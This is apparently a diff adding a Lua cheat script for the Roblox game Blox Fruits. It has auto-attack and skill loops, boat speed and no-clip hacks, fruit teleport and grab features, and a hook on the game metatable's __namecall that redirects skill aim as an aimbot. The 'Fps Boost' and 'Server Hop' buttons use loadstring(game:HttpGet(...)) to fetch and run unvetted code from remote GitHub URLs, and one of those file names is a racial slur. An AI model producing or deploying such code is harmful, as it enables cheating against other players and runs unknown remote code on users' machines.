+                    TweenPlayer((GetHighestPoint()).CFrame * CFrame.new(0, 211.88, 0));
+                end
+            end
+        end
+    end);
+end);
+SeaBeastSeaStackSection = Tabs.SeaStackTab:Section({
+    Title = "Sea Beasts",
+    TextXAlignment = "Left"
+});
+AutoAttackSeaBeastsToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Auto Attack Seabeasts",
+    Value = _G.Settings.SeaStack["Auto Attack Seabeasts"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Auto Attack Seabeasts"] = state;
+        StopTween(_G.Settings.SeaStack["Auto Attack Seabeasts"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait() do
+            if _G.Settings.SeaStack["Auto Attack Seabeasts"] and (World2 or World3) then
+                if (game:GetService("Workspace")):FindFirstChild("SeaBeasts") then
+                    for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+                        if CheckSeaBeast() then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                CFrameSeaBeast = v.HumanoidRootPart.CFrame * CFrame.new(0, 200, 0);
+                                if (CFrameSeaBeast.Position -
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude <=
+                                    400 then
+                                    _G.SeaSkill = true;
+                                else
+                                    _G.SeaSkill = false;
+                                end
+                                AutoHaki();
+                                Skillaimbot = true;
+                                AimBotSkillPosition = v.HumanoidRootPart.CFrame.Position;
+                                if SBAttacking then
+                                    TweenPlayer(CFrameSeaBeast *
+                                                    CFrame.new(math.random(100, 300), 100, math.random(100, 300)));
+                                else
+                                    TweenPlayer(CFrameSeaBeast * CFrame.new(0, 100, 0));
+                                end
+                            until not _G.Settings.SeaEvent["Auto Attack Seabeasts"] or CheckSeaBeast() == false or
+                                (not v:FindFirstChild("Humanoid")) or (not v:FindFirstChild("HumanoidRootPart")) or
+                                v.Humanoid.Health < 0 or (not v.Parent);
+                            Skillaimbot = false;
+                            _G.SeaSkill = false;
+                        else
+                            Skillaimbot = false;
+                            _G.SeaSkill = false;
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+SettingSeaSection = Tabs.SeaSettingsTab:Section({
+    Title = "Setting Sea",
+    TextXAlignment = "Left"
+});
+LightningToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Lightning",
+    Value = _G.Settings.SettingSea.Lightning,
+    Callback = function(state)
+        _G.Settings.SettingSea.Lightning = state;
+    end
+});
+local RunService = game:GetService("RunService");
+RunService.Heartbeat:Connect(function()
+    local Lighting = game:GetService("Lighting");
+    if _G.Settings.SettingSea.Lightning then
+        Lighting.ClockTime = 12;
+    end
+end);
+IncreaseSpeedBoatToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Increase Speed Boat",
+    Value = _G.Settings.SettingSea["Increase Speed Boat"],
+    Callback = function(state)
+        _G.Settings.SettingSea["Increase Speed Boat"] = state;
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            local vehicleSeats = {};
+            for i, v in pairs(game.Workspace.Boats:GetDescendants()) do
+                if v:IsA("VehicleSeat") then
+                    table.insert(vehicleSeats, v);
+                end
+            end
+            if _G.Settings.SettingSea["Increase Boat Speed"] then
+                for _, v in pairs(vehicleSeats) do
+                    v.MaxSpeed = 350;
+                end
+            else
+                for _, v in pairs(vehicleSeats) do
+                    v.MaxSpeed = 150;
+                end
+            end
+        end);
+    end
+end);
+NoClipRockToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "No Clip Rock",
+    Value = _G.Settings.SettingSea["No Clip Rock"],
+    Callback = function(state)
+        _G.Settings.SettingSea["No Clip Rock"] = state;
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            for i, boat in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+                for _, v in pairs((game:GetService("Workspace")).Boats[boat.Name]:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        if _G.Settings.SettingSea["No Clip Rock"] or _G.Settings.SeaEvent["Sail Boat"] then
+                            v.CanCollide = false;
+                        else
+                            v.CanCollide = true;
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+SettingSeaSection = Tabs.SeaSettingsTab:Section({
+    Title = "Tools",
+    TextXAlignment = "Left"
+});
+UseDevilFruitSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Use Devil Fruit Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Use Devil Fruit Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+UseMeleeSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Use Melee Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Use Melee Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+UseSwordSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Use Sword Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Use Sword Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+UseGunSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Use Gun Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Use Gun Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+DevilFruitSkillSection = Tabs.SeaSettingsTab:Section({
+    Title = "Devil Fruit Skill",
+    TextXAlignment = "Left"
+});
+DevilFruitZSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Devil Fruit Z Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Devil Fruit Z Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+DevilFruitXSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Devil Fruit X Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Devil Fruit X Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+DevilFruitCSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Devil Fruit C Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Devil Fruit C Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+DevilFruitVSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Devil Fruit V Skill",
+    Value = _G.Settings.SettingSea["Devil Fruit V Skill"],
+    Callback = function(state)
+        _G.Settings.SettingSea["Devil Fruit V Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+DevilFruitFSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Devil Fruit F Skill",
+    Value = _G.Settings.SettingSea["Devil Fruit F Skill"],
+    Callback = function(state)
+        _G.Settings.SettingSea["Devil Fruit F Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MeleeSkillSection = Tabs.SeaSettingsTab:Section({
+    Title = "Melee Skill",
+    TextXAlignment = "Left"
+});
+MeleeZSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Melee Z Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Melee Z Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MeleeXSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Melee X Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Melee X Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MeleeCSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Melee C Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Melee C Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MeleeVSkillToggle = Tabs.SeaSettingsTab:Toggle({
+    Title = "Melee V Skill",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.SettingSea["Melee V Skill"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+DoneSkillGun = false;
+DoneSkillSword = false;
+DoneSkillFruit = false;
+DoneSkillMelee = false;
+spawn(function()
+    while wait() do
+        pcall(function()
+            if _G.SeaSkill then
+                if _G.Settings.SettingSea["Use Devil Fruit Skill"] and DoneSkillFruit == false then
+                    for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                        if v:IsA("Tool") then
+                            if v.ToolTip == "Blox Fruit" then
+                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                            end
+                        end
+                    end
+                    if _G.Settings.SettingSea["Devil Fruit Z Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+                        wait();
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+                    end
+                    if _G.Settings.SettingSea["Devil Fruit X Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+                        wait();
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+                    end
+                    if _G.Settings.SettingSea["Devil Fruit C Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+                        wait();
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+                    end
+                    if _G.Settings.SettingSea["Devil Fruit V Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+                        wait();
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+                    end
+                    if _G.Settings.SettingSea["Devil Fruit F Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "F", false, game);
+                        wait();
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "F", false, game);
+                    end
+                    DoneSkillFruit = true;
+                end
+                if _G.Settings.SettingSea["Use Melee Skill"] and DoneSkillMelee == false then
+                    for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                        if v:IsA("Tool") then
+                            if v.ToolTip == "Melee" then
+                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                            end
+                        end
+                    end
+                    if _G.Settings.SettingSea["Melee Z Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+                        wait(0);
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+                    end
+                    if _G.Settings.SettingSea["Melee X Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+                        wait(0);
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+                    end
+                    if _G.Settings.SettingSea["Melee C Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+                        wait(0);
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+                    end
+                    if _G.Settings.SettingSea["Melee V Skill"] then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+                        wait(0);
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+                    end
+                    DoneSkillMelee = true;
+                end
+                if _G.Settings.SettingSea["Use Sword Skill"] and DoneSkillSword == false then
+                    for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                        if v:IsA("Tool") then
+                            if v.ToolTip == "Sword" then
+                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                            end
+                        end
+                    end
+                    (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+                    wait(0);
+                    (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+                    (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+                    wait(0);
+                    (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+                    DoneSkillSword = true;
+                end
+                if _G.Settings.SettingSea["Use Gun Skill"] and DoneSkillGun == false then
+                    for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                        if v:IsA("Tool") then
+                            if v.ToolTip == "Gun" then
+                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                            end
+                        end
+                    end
+                    (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+                    wait(0.1);
+                    (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+                    (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+                    wait(0.1);
+                    (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+                    DoneSkillGun = true;
+                end
+                DoneSkillGun = false;
+                DoneSkillSword = false;
+                DoneSkillFruit = false;
+                DoneSkillMelee = false;
+            end
+        end);
+    end
+end);
+function CheckSeaBeast()
+    if (game:GetService("Workspace")):FindFirstChild("SeaBeasts") then
+        for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+            if v:FindFirstChild("Humanoid") or v:FindFirstChild("HumanoidRootPart") or v.Humanoid.Health < 0 then
+                return true;
+            end
+        end
+    end
+    return false;
+end
+local gg = getrawmetatable(game);
+local old = gg.__namecall;
+setreadonly(gg, false);
+gg.__namecall = newcclosure(function(...)
+    local method = getnamecallmethod();
+    local args = {...};
+    if tostring(method) == "FireServer" then
+        if tostring(args[1]) == "RemoteEvent" then
+            if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
+                if Skillaimbot then
+                    args[2] = AimBotSkillPosition;
+                    return old(unpack(args));
+                end
+            end
+        end
+    end
+    return old(...);
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if UseSkill then
+                for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                    if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                        v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] / 100 then
+                        if _G.Settings.Setting["Fruit Mastery Skill Z"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+                        end
+                        if _G.Settings.Setting["Fruit Mastery Skill X"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+                        end
+                        if _G.Settings.Setting["Fruit Mastery Skill C"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+                        end
+                        if _G.Settings.Setting["Fruit Mastery Skill V"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+                        end
+                        if _G.Settings.Setting["Fruit Mastery Skill F"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "F", false, game);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "F", false, game);
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    while wait() do
+        pcall(function()
+            if UseGunSkill then
+                for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                    if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                        v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] / 100 then
+                        if _G.Settings.Setting["Gun Mastery Skill Z"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+                            wait(0.5);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+                        end
+                        if _G.Settings.Setting["Gun Mastery Skill X"] then
+                            (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+                            wait(0.5);
+                            (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+LocalPlayerSection = Tabs.LocalPlayerTab:Section({
+    Title = "Local Player",
+    TextXAlignment = "Left"
+});
+AutoActiveRaceV3Toggle = Tabs.LocalPlayerTab:Toggle({
+    Title = "Active Race V3",
+    Desc = "Auto Turn On Tribe V3",
+    Value = _G.Settings.LocalPlayer["Active Race V3"],
+    Callback = function(state)
+        _G.Settings.LocalPlayer["Active Race V3"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoActiveRaceV4Toggle = Tabs.LocalPlayerTab:Toggle({
+    Title = "Active Race V4",
+    Desc = "Auto Turn On Tribe V4",
+    Value = _G.Settings.LocalPlayer["Active Race V4"],
+    Callback = function(state)
+        _G.Settings.LocalPlayer["Active Race V4"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.LocalPlayer["Active Race V4"] then
+            if tonumber(((game:GetService("Players")).LocalPlayer.Character:WaitForChild("RaceEnergy")).Value) == 1 then
+                if (game:GetService("Players")).LocalPlayer.Character.RaceTransformed.Value == false then
+                    (game:GetService("VirtualInputManager")):SendKeyEvent(true, "Y", false, game);
+                    wait(0.1);
+                    (game:GetService("VirtualInputManager")):SendKeyEvent(false, "Y", false, game);
+                end
+            end
+        end
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait(1) do
+            if _G.Settings.LocalPlayer["Active Race V3"] then
+                (game:GetService("ReplicatedStorage")).Remotes.CommE:FireServer("ActivateAbility");
+            end
+        end
+    end);
+end);
+WalkOnWaterToggle = Tabs.LocalPlayerTab:Toggle({
+    Title = "Walk On Water",
+    Desc = "Moving on Water Surface (Jesus)",
+    Value = _G.Settings.LocalPlayer["Walk On Water"],
+    Callback = function(state)
+        _G.Settings.LocalPlayer["Walk On Water"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while task.wait(0.2) do
+        pcall(function()
+            if _G.Settings.LocalPlayer["Walk On Water"] then
+                (game:GetService("Workspace")).Map["WaterBase-Plane"].Size = Vector3.new(1000, 112, 1000);
+            else
+                (game:GetService("Workspace")).Map["WaterBase-Plane"].Size = Vector3.new(1000, 80, 1000);
+            end
+        end);
+    end
+end);
+NoClipPlayerToggle = Tabs.LocalPlayerTab:Toggle({
+    Title = "No Clip",
+    Desc = "Travel Through Walls",
+    Value = _G.Settings.LocalPlayer["No Clip"],
+    Callback = function(state)
+        _G.Settings.LocalPlayer["No Clip"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+FruitSection = Tabs.FruitTab:Section({
+    Title = "Fruit",
+    TextXAlignment = "Left"
+});
+AutoRandomFruitToggle = Tabs.FruitTab:Toggle({
+    Title = "Auto Random Fruit",
+    Value = _G.Settings.Fruit["Auto Buy Random Fruit"],
+    Callback = function(state)
+        _G.Settings.Fruit["Auto Buy Random Fruit"] = state;
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Fruit["Auto Buy Random Fruit"] then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Cousin", "Buy");
+            end
+        end
+    end);
+end);
+local RarityFruits = {
+    Common = {"Rocket Fruit", "Spin Fruit", "Blade Fruit", "Spring Fruit", "Bomb Fruit", "Smoke Fruit", "Spike Fruit"},
+    Uncommon = {"Flame Fruit", "Falcon Fruit", "Ice Fruit", "Sand Fruit", "Diamond Fruit", "Dark Fruit"},
+    Rare = {"Light Fruit", "Rubber Fruit", "Barrier Fruit", "Ghost Fruit", "Magma Fruit"},
+    Legendary = {"Quake Fruit", "Buddha Fruit", "Love Fruit", "Spider Fruit", "Sound Fruit", "Phoenix Fruit",
+                 "Portal Fruit", "Rumble Fruit", "Pain Fruit", "Blizzard Fruit"},
+    Mythical = {"Gravity Fruit", "Mammoth Fruit", "T-Rex Fruit", "Dough Fruit", "Shadow Fruit", "Venom Fruit",
+                "Control Fruit", "Gas Fruit", "Spirit Fruit", "Leopard Fruit", "Yeti Fruit", "Kitsune Fruit",
+                "Dragon Fruit"}
+};
+local SelectRarityFruits = {"Common - Mythical", "Uncommon - Mythical", "Rare - Mythical", "Legendary - Mythical",
+                            "Mythical"};
+StoreRarityFruitDropdown = Tabs.FruitTab:Dropdown({
+    Title = "Store Rarity Fruit",
+    Values = SelectRarityFruits,
+    Value = _G.Settings.Fruit["Store Rarity Fruit"],
+    Callback = function(option)
+        _G.Settings.Fruit["Store Rarity Fruit"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+function CheckFruits()
+    for i, v in pairs(RarityFruits) do
+        if _G.Settings.Fruit["Store Rarity Fruit"] == "Common - Mythical" then
+            if i == "Common" or i == "Uncommon" or i == "Rare" or i == "Legendary" or i == "Mythical" then
+                for _, fruit in ipairs(v) do
+                    table.insert(ResultStoreFruits, fruit);
+                end
+            end
+        elseif _G.Settings.Fruit["Store Rarity Fruit"] == "Uncommon - Mythical" then
+            if i == "Uncommon" or i == "Rare" or i == "Legendary" or i == "Mythical" then
+                for _, fruit in ipairs(v) do
+                    table.insert(ResultStoreFruits, fruit);
+                end
+            end
+        elseif _G.Settings.Fruit["Store Rarity Fruit"] == "Rare - Mythical" then
+            if i == "Rare" or i == "Legendary" or i == "Mythical" then
+                for _, fruit in ipairs(v) do
+                    table.insert(ResultStoreFruits, fruit);
+                end
+            end
+        elseif _G.Settings.Fruit["Store Rarity Fruit"] == "Legendary - Mythical" then
+            if i == "Legendary" or i == "Mythical" then
+                for _, fruit in ipairs(v) do
+                    table.insert(ResultStoreFruits, fruit);
+                end
+            end
+        elseif _G.Settings.Fruit["Store Rarity Fruit"] == "Mythical" then
+            if i == "Mythical" then
+                for _, fruit in ipairs(v) do
+                    table.insert(ResultStoreFruits, fruit);
+                end
+            end
+        end
+    end
+end
+AutoStoreFruitToggle = Tabs.FruitTab:Toggle({
+    Title = "Auto Store Fruit",
+    Value = _G.Settings.Fruit["Auto Store Fruit"],
+    Callback = function(state)
+        _G.Settings.Fruit["Auto Store Fruit"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Fruit["Auto Store Fruit"] then
+                for i, v in pairs((game:GetService("Players")).LocalPlayer.Backpack:GetChildren()) do
+                    if string.find(v.Name, "Fruit") then
+                        ResultStoreFruits = {};
+                        CheckFruits();
+                        for z, Res in pairs(ResultStoreFruits) do
+                            if v.Name == Res then
+                                local NameFruit = v.Name;
+                                local FirstNameFruit = string.gsub(v.Name, " Fruit", "");
+                                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild(NameFruit) then
+                                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StoreFruit",
+                                        FirstNameFruit .. "-" .. FirstNameFruit,
+                                        (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild(NameFruit));
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+FruitNotification = Tabs.FruitTab:Toggle({
+    Title = "Fruit Notification",
+    Value = _G.Settings.Fruit["Fruit Notification"],
+    Callback = function(state)
+        _G.Settings.Fruit["Fruit Notification"] = value;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(2) do
+        if _G.Settings.Fruit["Fruit Notification"] then
+            for i, v in pairs(game.Workspace:GetChildren()) do
+                if string.find(v.Name, "Fruit") then
+                    WindUI:Notify({
+                        Title = "Fruit found",
+                        Content = v.Name,
+                        Icon = "bell",
+                        Duration = 3
+                    });
+                end
+            end
+        end
+    end
+end);
+TeleportToFruitToggle = Tabs.FruitTab:Toggle({
+    Title = "Teleport To Fruit",
+    Value = _G.Settings.Fruit["Teleport To Fruit"],
+    Callback = function(state)
+        _G.Settings.Fruit["Teleport To Fruit"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Fruit["Teleport To Fruit"] then
+            for i, v in pairs(game.Workspace:GetChildren()) do
+                if string.find(v.Name, "Fruit") then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Handle.CFrame;
+                end
+            end
+        end
+    end
+end);
+TweenToFruitToggle = Tabs.FruitTab:Toggle({
+    Title = "Tween To Fruit",
+    Value = _G.Settings.Fruit["Tween To Fruit"],
+    Callback = function(state)
+        _G.Settings.Fruit["Tween To Fruit"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Fruit["Tween To Fruit"] then
+            for i, v in pairs(game.Workspace:GetChildren()) do
+                if string.find(v.Name, "Fruit") then
+                    TweenPlayer(v.Handle.CFrame);
+                end
+            end
+        end
+    end
+end);
+GrabFruitButton = Tabs.FruitTab:Button({
+    Title = "Grab Fruit",
+    Callback = function()
+        for i, v in pairs(game.Workspace:GetChildren()) do
+            if v:IsA("Tool") then
+                v.Handle.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
+            end
+        end
+    end
+});
+VisualSection = Tabs.FruitTab:Section({
+    Title = "Visual",
+    TextXAlignment = "Left"
+});
+function rainFruit()
+    for h, i in pairs((game:GetObjects("rbxassetid://14759368201"))[1]:GetChildren()) do
+        i.Parent = game.Workspace.Map;
+        i:MoveTo(game.Players.LocalPlayer.Character.PrimaryPart.Position +
+                     Vector3.new(math.random((-50), 50), 100, math.random((-50), 50)));
+        if i.Fruit:FindFirstChild("AnimationController") then
+            ((i.Fruit:FindFirstChild("AnimationController")):LoadAnimation(i.Fruit:FindFirstChild("Idle"))):Play();
+        end
+        i.Handle.Touched:Connect(function(cR)
+            if cR.Parent == game.Players.LocalPlayer.Character then
+                i.Parent = game.Players.LocalPlayer.Backpack;
+                game.Players.LocalPlayer.Character.Humanoid:EquipTool(i);
+            end
+        end);
+    end
+end
+RainFruitButton = Tabs.FruitTab:Button({
+    Title = "Rain Fruit",
+    Callback = function()
+        rainFruit();
+    end
+});
+MiscSection = Tabs.MiscTab:Section({
+    Title = "Misc",
+    TextXAlignment = "Left"
+});
+JoinPiratesTeamButton = Tabs.MiscTab:Button({
+    Title = "Join Pirates Team",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetTeam", "Pirates");
+    end
+});
+JoinMarinesTeamButton = Tabs.MiscTab:Button({
+    Title = "Join Marines Team",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetTeam", "Marines");
+    end
+});
+CodeSection = Tabs.MiscTab:Section({
+    Title = "Codes",
+    TextXAlignment = "Left"
+});
+local codeList = {"ZIOLES", "NOOB2ADMIN", "KITT_RESET", "Sub2CaptainMaui", "SUB2GAMERROBOT_RESET1", "kittgaming",
+                  "Sub2Fer999", "Enyu_is_Pro", "Magicbus", "JCWK", "Starcodeheo", "Bluxxy", "fudd10_v2", "FUDD10",
+                  "BIGNEWS", "THEGREATACE", "SUB2GAMERROBOT_EXP1", "Sub2OfficialNoobie", "StrawHatMaine",
+                  "SUB2NOOBMASTER123", "Sub2UncleKizaru", "Sub2Daigrock", "Axiore", "TantaiGaming"};
+
+function redeemCode(code)
+    (game:GetService("ReplicatedStorage")).Remotes.Redeem:InvokeServer(code);
+end
+local RedeemAllCodesButton = Tabs.MiscTab:Button({
+    Title = "Redeem All Codes",
+    Callback = function()
+        for i, v in pairs(codeList) do
+            redeemCode(v);
+        end
+    end
+});
+GraphicMiscSection = Tabs.MiscTab:Section({
+    Title = "Graphic",
+    TextXAlignment = "Left"
+});
+function boostFps()
+    local decalsyeeted = true;
+    local g = game;
+    local w = g.Workspace;
+    local l = g.Lighting;
+    local t = w.Terrain;
+    (settings()).Rendering.QualityLevel = "Level01";
+    for i, v in pairs(g:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+            v.Material = "Plastic";
+            v.Reflectance = 0;
+        elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+            v.Transparency = 1;
+        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+            v.Lifetime = NumberRange.new(0);
+        elseif v:IsA("Explosion") then
+            v.BlastPressure = 1;
+            v.BlastRadius = 1;
+        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+            v.Enabled = false;
+        end
+    end
+end
+FpsBoostButton = Tabs.MiscTab:Button({
+    Title = "Fps Boost (Roblox)",
+    Callback = function()
+        boostFps();
+    end
+});
+FpsBoostButton = Tabs.MiscTab:Button({
+    Title = "Fps Boost (Vylera Hub)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dyumra/DYHUB-Universal-Game/refs/heads/main/Nigga.lua"))()
+    end
+});
+RemoveFogButton = Tabs.MiscTab:Button({
+    Title = "Remove Fog",
+    Callback = function()
+        (game:GetService("Lighting")).LightingLayers:Destroy();
+        (game:GetService("Lighting")).Sky:Destroy();
+        game.Lighting.FogEnd = 9000000000;
+    end
+});
+RemoveLavaButton = Tabs.MiscTab:Button({
+    Title = "Remove Lava",
+    Callback = function()
+        for i, v in pairs(game.Workspace:GetDescendants()) do
+            if v.Name == "Lava" then
+                v:Destroy();
+            end
+        end
+        for i, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+            if v.Name == "Lava" then
+                v:Destroy();
+            end
+        end
+    end
+});
+ServerTabSection = Tabs.ServerTab:Section({
+    Title = "Server",
+    TextXAlignment = "Left"
+});
+RejoinServerButton = Tabs.ServerTab:Button({
+    Title = "Rejoin Server",
+    Callback = function()
+        (game:GetService("TeleportService")):Teleport(game.PlaceId);
+    end
+});
+ServerHopButton = Tabs.ServerTab:Button({
+    Title = "Server Hop",
+    Callback = function()
+        local module = (loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/raw-scriptpastebin/FE/main/Server_Hop_Settings")))();
+        module:Teleport(game.PlaceId);
+    end
+});
+JobIdParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Job ID",
+    Desc = game.JobId,
+    Buttons = {{
+        Title = "Copy",
+        Callback = function()
+            setclipboard(game.JobId);
+        end
+    }}
+});
